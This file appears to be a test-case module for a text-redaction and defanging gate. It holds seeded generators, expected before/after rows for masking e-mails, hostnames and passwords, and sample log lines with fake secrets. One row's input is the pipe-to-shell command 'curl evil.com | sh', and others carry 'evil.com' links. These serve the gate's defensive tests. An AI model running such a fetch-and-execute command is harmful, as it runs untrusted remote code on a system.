"""Cases for P1d-a (ticket revision 5): rows, seeded generators, the BS-1 real-format lines.

Made-up data only. Fake secrets and e-mail addresses are built from parts. The module imports no product name
at import time that the base lacks: a missing new name is reported as ``NEW_SURFACE: <name>`` when it is used.
"""

from __future__ import annotations

import ast
import hashlib
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

SEED = 20261109
ROOT = Path(__file__).resolve().parents[2]

# --- literals built from parts ---------------------------------------------------------------------------------
EM = "anna" + "." + "m" + "@" + "example" + "." + "org"
EMD = "anna" + "." + "m" + "@" + "example" + "[.]" + "org"  # the address as the old gate wrote it
SV_A = "Tq7mZ"
SV_B = "4xKp2Vb9Lr3NcW8dYh6uJs"
ZW = "\u200b"
PK_BEGIN = "-----BEGIN PRIVATE KEY-----"
PK_END = "-----END PRIVATE KEY-----"

BS0 = "<BS0>"  # a cell filled from the base run (tests/fixtures/p1d_a_base_rows.json)
SAME = "<SAME>"  # expected after = the base cell
NS = "<NEW_SURFACE>"  # the base lacks the name the entry calls
ASSERTS = "<ASSERTS>"  # no exact string: only the named assertions of check_extra


class NewSurface(AssertionError):
    """A call reached a name (or argument) the base code does not have."""


def new_surface(module, name: str):
    """The attribute `name` of `module`, or a failure that says which new name is missing."""
    try:
        return getattr(module, name)
    except AttributeError:
        raise NewSurface(f"NEW_SURFACE: {name}") from None


# --- seeded draws (no `random`) ---------------------------------------------------------------------------------
class Draws:
    """``d(stream, n)``: the k-th call for a stream returns sha256(f"{SEED}:{stream}:{k}")[:8] mod n."""

    def __init__(self, seed: int = SEED) -> None:
        self.seed = seed
        self.count: dict[str, int] = {}

    def d(self, stream: str, n: int) -> int:
        k = self.count.get(stream, 0)
        self.count[stream] = k + 1
        digest = hashlib.sha256(f"{self.seed}:{stream}:{k}".encode()).digest()
        return int.from_bytes(digest[:8], "big") % n

    def pick(self, stream: str, seq):
        return seq[self.d(stream, len(seq))]


LETTERS = "abcdefghijklmnopqrstuvwxyz"
DIGITS = "0123456789"
_TOKENS = [
    "```",
    "~~~",
    "[.]",
    "evil.com",
    "www.evil.digital",
    "db01.corp.example.com",
    EM,
    "<HOSTNAME_1>",
    "<EMAIL_1>",
    "password=",
    "?password=",
    SV_B,
    PK_BEGIN,
]
_SINGLES_A = [
    *LETTERS,
    *DIGITS,
    " ",
    "\n",
    ".",
    "@",
    "-",
    "_",
    "=",
    "&",
    "?",
    "/",
    ":",
    "#",
    ">",
    "*",
    "[",
    "]",
    "<",
    "é",
    "例",
    "`",
    "。",
    "．",
    "｡",
]
ALPHABET_A = [*_SINGLES_A, *_TOKENS]
_NOT_IN_B = {"[", "]", "[.]", "。", "．", "｡"}
ALPHABET_B = [e for e in ALPHABET_A if e not in _NOT_IN_B]
# The ticket (rev 5) says 63 and 57 entries, but the list it spells out has 72 and 66 (36 letters and digits, 23
# other single characters, 13 tokens). The spelled-out list is used; the ticket count is a counting slip (build note).
assert len(ALPHABET_A) == 72, len(ALPHABET_A)
assert len(ALPHABET_B) == 66, len(ALPHABET_B)


def gen_txt(draws: Draws, stream: str, alphabet) -> str:
    n = draws.d(stream, 201)
    return "".join(draws.pick(stream, alphabet) for _ in range(n))


def _letters(draws: Draws, s: str, a: int, b: int | None = None) -> str:
    n = a if b is None else a + draws.d(s, b - a + 1)
    return "".join(draws.pick(s, LETTERS) for _ in range(n))


def gen_eh(draws: Draws, s: str = "EH") -> str:
    lines = []
    for _ in range(1 + draws.d(s, 3)):
        words = []
        for _ in range(1 + draws.d(s, 6)):
            k = draws.d(s, 4)
            if k in (0, 1):
                words.append(_letters(draws, s, 1, 8))
            elif k == 2:
                words.append(
                    _letters(draws, s, 3, 8) + "." + _letters(draws, s, 1) + "@" + "example.org"
                )
            else:
                digits = draws.pick(s, DIGITS) + draws.pick(s, DIGITS)
                words.append("db" + digits + "." + "corp" + "." + "example" + "." + "com")
        lines.append(" ".join(words))
    return "\n".join(lines)


def texts(kind: str, count: int = 2000) -> list[str]:
    draws = Draws()
    if kind == "TXT-A":
        return [gen_txt(draws, "TXT-A", ALPHABET_A) for _ in range(count)]
    if kind == "TXT-B":
        return [gen_txt(draws, "TXT-B", ALPHABET_B) for _ in range(count)]
    if kind == "EH":
        return [gen_eh(draws, "EH") for _ in range(count)]
    raise ValueError(kind)


# LIT: string literals passed directly to the gate in the existing gate tests.
LIT_FILES = (
    "tests/warden_port/test_gate.py",
    "tests/warden_port/test_gate_render.py",
    "tests/warden_port/test_gate_review2.py",
    "tests/warden_port/test_gate_review3.py",
    "tests/test_g4_parity.py",
    "tests/test_k5_round9.py",
    "tests/test_k5_round11.py",
    "tests/test_p5p6_followups.py",
)
_GATE_CALLS = {"sanitise_text", "clean", "withhold_commands"}


def lit_strings() -> list[str]:
    out: list[str] = []
    for rel in LIT_FILES:
        tree = ast.parse((ROOT / rel).read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            f = node.func
            name = f.attr if isinstance(f, ast.Attribute) else getattr(f, "id", "")
            if name in _GATE_CALLS:
                for a in node.args:
                    if (
                        isinstance(a, ast.Constant)
                        and isinstance(a.value, str)
                        and a.value not in out
                    ):
                        out.append(a.value)
    return out


# --- entries -----------------------------------------------------------------------------------------------------
def _mods():
    from hadavin_sdk.approvals import channel, gate, slack_channel
    from hadavin_sdk.guard import runmap

    return channel, gate, slack_channel, runmap


def e_card(x: str) -> str:
    channel, *_ = _mods()
    return channel.clean(x)


def e_model(x: str) -> str:
    *_, runmap = _mods()
    return runmap.redact_text(x, runmap.RunMap())


def e_slack(x: str) -> str:
    _, _, slack_channel, _ = _mods()
    ch = slack_channel.SlackChannel.__new__(slack_channel.SlackChannel)
    ch.max_card_chars = 2900
    req = SimpleNamespace(summary=x, current_step=0, steps=[1], approval_id="a", status="PENDING")
    return ch._blocks(req, None)[0]["text"]["text"]


def e_defang(x: str) -> str:
    _, gate, *_ = _mods()
    return new_surface(gate, "defang_text")(x)


def e_gate(x: str) -> str:
    _, gate, *_ = _mods()
    try:
        return gate.sanitise_text(x, defang=False)
    except TypeError:
        raise NewSurface("NEW_SURFACE: defang") from None


ENTRIES = {"card": e_card, "model": e_model, "slack": e_slack, "defang": e_defang, "gate": e_gate}


def _fb1(x: str) -> str:
    _, gate, *_ = _mods()
    with mock.patch.object(gate, "_closed_fences", lambda text: [(0, 1, "`")]):
        return e_gate(x)


def _fb2(x: str) -> str:
    _, gate, *_ = _mods()
    real = gate._closed_fences
    calls: list[str] = []

    def planned_then_different(text):
        calls.append(text)
        return real(text) if len(calls) == 1 else []

    with mock.patch.object(gate, "_closed_fences", planned_then_different):
        return e_gate(x)


def _h27_card(x: str, ctx: dict) -> str:
    """H27: the card, with a spy on the redactor's inner call (R5)."""
    *_, runmap = _mods()
    real = runmap.redact
    seen: list[str] = []

    def spy(text, *args, **kwargs):
        seen.append(text)
        return real(text, *args, **kwargs)

    with mock.patch.object(runmap, "redact", spy):
        out = e_card(x)
    ctx["seen"] = seen
    return out


def _t1_card(x: str, ctx: dict) -> str:
    """T1: the card, with a spy on ``runmap.redact_text`` (the call ``clean`` makes through the module)."""
    *_, runmap = _mods()
    real = runmap.redact_text
    returns: list[str] = []

    def spy(*args, **kwargs):
        r = real(*args, **kwargs)
        returns.append(r)
        return r

    with mock.patch.object(runmap, "redact_text", spy):
        out = e_card(x)
    ctx["returns"] = returns
    return out


SPECIAL = {
    ("H27", "card"): _h27_card,
    ("T1", "card"): _t1_card,
    ("FB1", "gate"): lambda x, ctx: _fb1(x),
    ("FB2", "gate"): lambda x, ctx: _fb2(x),
}


def run_entry(row_id: str, entry: str, x: str) -> tuple[str, dict]:
    ctx: dict = {}
    fn = SPECIAL.get((row_id, entry))
    out = fn(x, ctx) if fn else ENTRIES[entry](x)
    return out, ctx


# --- rows --------------------------------------------------------------------------------------------------------
class Row(SimpleNamespace):
    """id, cls (fb/pb/ow), entries, input, base (str | dict), after (str | dict)."""


def R(id, cls, entries, x, base, after):
    return Row(id=id, cls=cls, entries=tuple(entries.split(",")), input=x, base=base, after=after)


# Ticket rev 5 wrote `"a" * 2894 + " x.com"`; on the base that run of one letter is masked as a high-entropy key (BS-0),
# so the input is not 2,900 characters shown. Words are used instead: same length (2,900), unmasked (build note).
L9_INPUT = ("lorem " * 500)[:2894] + " x.com"
L9_NOTICE = "(the summary is too long to show here; open the full request in the console)"
L8_INPUT = (
    "```\na\n```\n"
    + PK_BEGIN
    + "\nMIIB"
    + SV_B
    + SV_B
    + "\n"
    + PK_END
    + "\nvisit evil.com\n```\nb\n```"
)
T1_INPUT = "password%<i></i>3D" + SV_B + " see evil.com"

ROWS: list[Row] = [
    R(
        "H26",
        "fb",
        "card",
        f"contact {EM} please",
        f"contact {EMD} please",
        "contact <EMAIL_1> please",
    ),
    R(
        "H27",
        "fb",
        "card",
        "host db01.corp.example.com down",
        "host db01[.]corp[.]example[.]com down",
        "host <HOSTNAME_1>[.]example[.]com down",
    ),
    R("H36a", "fb", "card", "anna%2Em%40example%2Eorg", "anna%2Em%40example%2Eorg", "<EMAIL_1>"),
    R(
        "H36b",
        "fb",
        "card",
        "anna&#46;m&#64;example&#46;org",
        "anna&amp;#46;m&amp;#64;example&amp;#46;org",
        "<EMAIL_1>",
    ),
    R("E1", "fb", "card", f"~~~\nmail {EM}\n~~~", BS0, "~~~\nmail <EMAIL_1>\n~~~"),
    R("I2", "fb", "card", f"```mail {EM}\nx\n```", BS0, "```mail <EMAIL_1>\nx\n```"),
    R("PF1", "fb", "card", f"mail {EM}\n```\nx\n```", BS0, "mail <EMAIL_1>\n```\nx\n```"),
    R("PF2", "fb", "card", f"```\nx\n```\nmail {EM}", BS0, "```\nx\n```\nmail <EMAIL_1>"),
    R("FB1", "fb", "gate", "mail evil.com\nx", NS, "mail evil.com\nx"),
    R("FB2", "fb", "gate", "```\nmail evil.com\n```", NS, ASSERTS),
    R(
        "L7",
        "fb",
        "slack",
        f"contact {EMD} please",
        f"contact {EMD} please",
        "contact <EMAIL_1> please",
    ),
    R(
        "L16",
        "fb",
        "slack",
        "see //evil[.]com/p now",
        "see //evil[.]com/p now",
        "see [link removed] now",
    ),
    R(
        "H34a",
        "fb",
        "card,model",
        "password=ab12&cd34ef56gh78ij",
        "password=<SECRET_1>&cd34ef56gh78ij",
        "password=<SECRET_1>",
    ),
    R(
        "H34b",
        "fb",
        "card,model",
        f"password={SV_A}&amp;{SV_B}",
        f"password=<SECRET_1>&amp;{SV_B}",
        "password=<SECRET_1>",
    ),
    R(
        "H34c",
        "fb",
        "card,model",
        f"password={SV_A}&{SV_B} end",
        f"password=<SECRET_1>&{SV_B} end",
        "password=<SECRET_1> end",
    ),
    R(
        "H34d",
        "fb",
        "card,model",
        "password=ab12&cd34ef56; next",
        {
            "card": "password=<SECRET_1>&amp;cd34ef56; next",
            "model": "password=<SECRET_1>&cd34ef56; next",
        },
        "password=<SECRET_1>; next",
    ),
    R(
        "SC1",
        "fb",
        "card,model",
        "password=ab&cd34;ef56",
        {"card": "password=<SECRET_1>&amp;cd34;ef56", "model": "password=<SECRET_1>&cd34;ef56"},
        "password=<SECRET_1>;ef56",
    ),
    R(
        "PU1",
        "fb",
        "card,model",
        "password=ab&amp; x",
        "password=<SECRET_1>&amp; x",
        "password=<SECRET_2> x",
    ),
    R(
        "Q4",
        "fb",
        "card,model",
        "?password=ab&cd34ef56&user=bob x",
        BS0,
        "?password=<SECRET_1>&user=bob x",
    ),
    R("Q5", "fb", "model", "?password=ab&cd34ef56", BS0, "?password=<SECRET_1>"),
    R(
        "Q8",
        "fb",
        "model",
        "?password=ab&amp;cd34ef56&amp;user=bob x",
        BS0,
        "?password=<SECRET_1>&amp;user=bob x",
    ),
    R("Q10", "fb", "model", "?password=ab&cd34#x=1 y", BS0, "?password=<SECRET_1> y"),
    R("Q11", "fb", "model", "?password=ab&cd34 x=1", BS0, "?password=<SECRET_1> x=1"),
    R(
        "Q12",
        "fb",
        "card,model",
        "?password=ab&cd34; x",
        {"card": "?password=<SECRET_1>&amp;cd34; x", "model": "?password=<SECRET_1>&cd34; x"},
        "?password=<SECRET_1>; x",
    ),
    R(
        "Q14",
        "fb",
        "card,model",
        "?user=bob&password=ab&cd34ef56 x",
        "?user=bob&password=<SECRET_1>&cd34ef56 x",
        "?user=bob&password=<SECRET_1> x",
    ),
    R(
        "Q16",
        "fb",
        "card,model",
        '?password=ab&cd34"x=1 y',
        '?password=<SECRET_1>&cd34"x=1 y',
        '?password=<SECRET_1>"x=1 y',
    ),
    R(
        "Q17",
        "fb",
        "model",
        '?password=ab&amp;cd34"x=1 y',
        '?password=<SECRET_1>&amp;cd34"x=1 y',
        '?password=<SECRET_1>"x=1 y',
    ),
    R(
        "KV1",
        "fb",
        "model",
        "password=ab12&cd34ef56gh78ij and later ab12&cd34ef56gh78ij",
        BS0,
        "password=<SECRET_1> and later <SECRET_1>",
    ),
    # INFO-K41 (lead ORDER 192): a key behind 41 or more name characters showed its value on the base.
    R(
        "K41",
        "fb",
        "card,model",
        "a" * 41 + "password=hunter22 x",
        BS0,
        "a" * 41 + "password=<SECRET_1> x",
    ),
    R(
        "K41q",
        "fb",
        "model",
        "?" + "a" * 41 + "password=ab&cd34ef56 x",
        BS0,
        "?" + "a" * 41 + "password=<SECRET_1> x",
    ),
    R("D3a", "fb", "defang", "<HOSTNAME_1>. next", NS, "<HOSTNAME_1>. next"),
    R("D3b", "fb", "defang", "mail <EMAIL_1>.org", NS, "mail <EMAIL_1>[.]org"),
    R(
        "D3c",
        "fb",
        "defang",
        "x `<HOSTNAME_1>.example.com` y",
        NS,
        "x `<HOSTNAME_1>.example.com` y",
    ),
    R("D3d", "fb", "defang", "<HOSTNAME_1>.例え.jp", NS, "<HOSTNAME_1>[.]例え[.]jp"),
    R("D3e", "fb", "defang", "<HOSTNAME_1>。example.com", NS, "<HOSTNAME_1>[.]example[.]com"),
    R("D3f", "fb", "defang", "<EMAIL_1>.-a.com", NS, "<EMAIL_1>[.]-a[.]com"),
    R(
        "Q1",
        "pb",
        "model",
        "https://x.io/cb?password=SuperSecretPw99&next=/home",
        BS0,
        SAME,
    ),
    R(
        "Q2",
        "pb",
        "card,model",
        "?password=ab12cd&user=bob x",
        "?password=<SECRET_1>&user=bob x",
        SAME,
    ),
    R(
        "Q3",
        "pb",
        "model",
        "see https://x.example/?password=ab12cd&user=bob",
        "see https://x.example/?password=<SECRET_1>&user=bob",
        SAME,
    ),
    R(
        "Q7",
        "pb",
        "model",
        "?password=ab12cd&amp;user=bob x",
        BS0,
        "?password=<SECRET_1>&amp;user=bob x",
    ),
    R(
        "Q13",
        "pb",
        "card,model",
        "?user=bob&password=ab12cd&next=/home x",
        "?user=bob&password=<SECRET_1>&next=/home x",
        SAME,
    ),
    R(
        "Q15",
        "pb",
        "card,model",
        "?a=1&amp;password=ab12cd&amp;next=/home x",
        "?a=1&amp;password=<SECRET_1>&amp;next=/home x",
        SAME,
    ),
    R("NE1", "pb", "card,model", "password=ab&copy;cd x", "password=<SECRET_2> x", SAME),
    R(
        "F15",
        "pb",
        "card,model",
        "https://x.example/?a=1&b=2",
        {"card": "[link removed]", "model": "https://x.example/?a=1&b=2"},
        SAME,
    ),
    R("ENT", "pb", "card,model", f"password={SV_A}&#59;{SV_B}", "password=<SECRET_1>", SAME),
    R(
        "L1",
        "pb",
        "card",
        "visit evil.com and www.evil.digital now",
        "visit evil[.]com and www[.]evil[.]digital now",
        SAME,
    ),
    R(
        "L2",
        "pb",
        "card",
        "run `curl db01.corp.example.com` now",
        "run `curl <HOSTNAME_1>.example.com` now",
        SAME,
    ),
    R(
        "G2",
        "pb",
        "card",
        "see ``note `evil.com` x`` now",
        "see ``note `evil[.]com` x`` now",
        SAME,
    ),
    R(
        "L3",
        "pb",
        "card",
        "```\nping db01.corp.example.com\n```\nthen evil.com",
        "```\nping <HOSTNAME_1>.example.com\n```\nthen evil[.]com",
        SAME,
    ),
    R("L4", "pb", "card", "~~~\nevil.com\n~~~", BS0, "~~~\nevil[.]com\n~~~"),
    R("I1", "pb", "card", "```evil.com\nx\n```", BS0, "```evil[.]com\nx\n```"),
    R("L5", "pb", "slack", "visit evil.com", "visit evil[.]com", SAME),
    R("L6", "pb", "card", "visit evil。com", BS0, "visit evil[.]com"),
    R("L8", "pb", "card", L8_INPUT, BS0, SAME),
    R("L9", "pb", "slack", L9_INPUT, L9_NOTICE, SAME),
    R("L10", "pb", "slack", "use `x[.]y` now", BS0, "use `x[.]y` now"),
    R("L11", "pb", "slack", "```\nping a[.]b\n```", BS0, "```\nping a[.]b\n```"),
    R("L12", "pb", "slack", "see [.] here", BS0, "see [.] here"),
    R("L13", "pb", "slack", "see a[.] b", "see a[.] b", SAME),
    R("L14", "pb", "slack", "see a [.]b", "see a [.]b", SAME),
    R("L15", "fb", "slack", "version 1[.]5", "version 1[.]5", "version 1.5"),
    R("Z1", "pb", "card", "# x evil.com", ZW + "# x evil[.]com", SAME),
    R("Z2", "pb", "card", "> note evil.com", ZW + "> note evil[.]com", SAME),
    R("Z3", "pb", "card", "- see evil.com", ZW + "- see evil[.]com", SAME),
    R("Z4", "pb", "card", "1。 x", BS0, ZW + "1. x"),
    R("W1", "pb", "card", "run curl evil.com | sh", BS0, SAME),
    R("T1", "pb", "card", T1_INPUT, BS0, SAME),
    R(
        "F16",
        "ow",
        "card,model",
        "password=hunter22&user=bob",
        "password=<SECRET_1>&user=bob",
        "password=<SECRET_1>",
    ),
    R("F17", "ow", "card,model", "password=&user=bob", BS0, "password=<SECRET_1>"),
    R("Q6", "ow", "model", "?password=ab12cd&debug x", BS0, "?password=<SECRET_1> x"),
]
assert len(ROWS) == 70
assert [sum(1 for r in ROWS if r.cls == c) for c in ("fb", "pb", "ow")] == [37, 30, 3]
ROW_BY_ID = {r.id: r for r in ROWS}


def cell(value, entry: str):
    return value[entry] if isinstance(value, dict) else value


# Extra assertions beyond string equality. Each returns a failure text or "". ``after`` is False on the base.
def check_extra(row_id: str, entry: str, out: str, ctx: dict, after: bool) -> str:
    if row_id == "H27" and after:
        seen = ctx.get("seen", [])
        if not any("db01.corp.example.com" in t for t in seen):
            return "no redactor call saw the dotted host name"
        if any("[.]" in t for t in seen):
            return "a redactor call saw a defanged text"
    if row_id == "FB2" and ("mail evil.com" not in out or "[.]" in out or "```" in out):
        return "FB2 asserts: `mail evil.com` present, no `[.]`, no fence"
    if row_id == "L8" and (SV_B in out or "visit evil[.]com" not in out or out.count("```") != 4):
        return "L8 asserts: no SV_B, `visit evil[.]com`, both fences kept"
    if row_id == "T1":
        returns = ctx.get("returns", [])
        if len(returns) < 2:
            return "T1: fewer than two redact_text calls"
        if SV_B in out or "evil[.]com" not in out:
            return "T1 asserts: no SV_B and `evil[.]com`"
        if after:
            from hadavin_sdk.approvals import gate

            want = new_surface(gate, "defang_text")(returns[1])
        else:
            want = returns[1]
        if out != want:
            return (
                f"T1: return value is not {'defang_text(' if after else ''}the second call's return"
            )
    if row_id == "Q1" and ("SuperSecretPw99" in out or "/home" not in out):
        return "Q1: secret shown or /home over-masked"
    return ""


# --- BS-1: the real-format lines ---------------------------------------------------------------------------------
REAL: list[tuple[str, str, str]] = [
    ("R1", '"GET /login?user=bob&password=Xy7&kQ2pLm HTTP/1.1" 200 512', "Xy7&kQ2pLm"),
    ("R2", '"GET /api?token=Ab12Cd34Ef56&page=2 HTTP/1.1" 200 90', "Ab12Cd34Ef56"),
    ("R3", '"POST /cb?api_key=Zz9&Yy8Xx7&lang=en HTTP/1.1" 302 0', "Zz9&Yy8Xx7"),
    ("R4", '"GET /r?ref=home&client_secret=Qw3&Er4Ty5 HTTP/1.1" 200 7', "Qw3&Er4Ty5"),
    ("R5", '"GET /s?pwd=Mn8Bv7Cx6&id=41&next=/home HTTP/1.1" 200 3', "Mn8Bv7Cx6"),
    ("R6", '"GET /t?auth_token=Pl0&Ok9Ij8&debug HTTP/1.1" 200 1', "Pl0&Ok9Ij8&debug"),
    ("R7", "DB_PASSWORD=Hg5&Fd4Sa3", "Hg5&Fd4Sa3"),
    ("R8", "API_KEY=Jk2Lm3&Np4 # rotated", "Jk2Lm3&Np4"),
    ("R9", 'client_secret: "Rt6&Yu7Io8"', "Rt6&Yu7Io8"),
    ("R10", "      - POSTGRES_PASSWORD=Vb1&Nm2Qw3", "Vb1&Nm2Qw3"),
    ("R11", "export TOKEN='As4&Df5Gh6'", "As4&Df5Gh6"),
    ("R12", "passwd=Ze7&Xc8Vb9;user=app", "Ze7&Xc8Vb9"),
    ("R13", "curl -d 'user=bob&password=Wq1&Er2Ty3' /login", "Wq1&Er2Ty3"),
    ("R14", "curl -d 'password=Ui4&Op5As6&user=bob' /login", "Ui4&Op5As6&user=bob"),
    ("R15", "./backup --password=Df7&Gh8Jk9 shop", "Df7&Gh8Jk9"),
    ("R16", "curl -H 'Accept: text/plain' -d 'token=Lz1&Xc2Vb3' /api", "Lz1&Xc2Vb3"),
    ("R17", './migrate --dsn "password=Nm4&Qw5Er6 user=app"', "Nm4&Qw5Er6"),
    ("R18", "wget '/dl?user=bob&api_key=Ty7&Ui8Op9'", "Ty7&Ui8Op9"),
    ("R19", "Server=db;Database=shop;User Id=app;Password=Aa1&Bb2Cc3;", "Aa1&Bb2Cc3"),
    ("R20", "Data Source=db;Password=Dd4&Ee5Ff6;Encrypt=true", "Dd4&Ee5Ff6"),
    ("R21", "Host=db;Port=5432;Password=Gg7&Hh8Ii9;Pooling=true", "Gg7&Hh8Ii9"),
    ("R22", "Password=Jj1&Kk2Ll3;Timeout=30", "Jj1&Kk2Ll3"),
    ("R23", '{"level":"info","password":"Mm4&Nn5Oo6","user":"bob"}', "Mm4&Nn5Oo6"),
    ("R24", '{"event":"login","token":"Pp7&Qq8Rr9"}', "Pp7&Qq8Rr9"),
    ("R25", '{"msg":"retry","api_key":"Ss1&Tt2Uu3","n":2}', "Ss1&Tt2Uu3"),
    ("R26", '{"client_secret":"Vv4&Ww5Xx6"}', "Vv4&Ww5Xx6"),
    ("R27", "link=/login?user=bob&amp;password=Yy7&amp;Zz8Aa9&amp;next=/home", "Yy7&amp;Zz8Aa9"),
    ("R28", "link=/cb?token=Bb1Cc2Dd3&amp;page=2", "Bb1Cc2Dd3"),
    ("R29", "img=/i?api_key=Ee4&amp;Ff5Gg6 x", "Ee4&amp;Ff5Gg6"),
    ("R30", "link=/r?ref=x&amp;pwd=Hh7&amp;Ii8Jj9", "Hh7&amp;Ii8Jj9"),
]
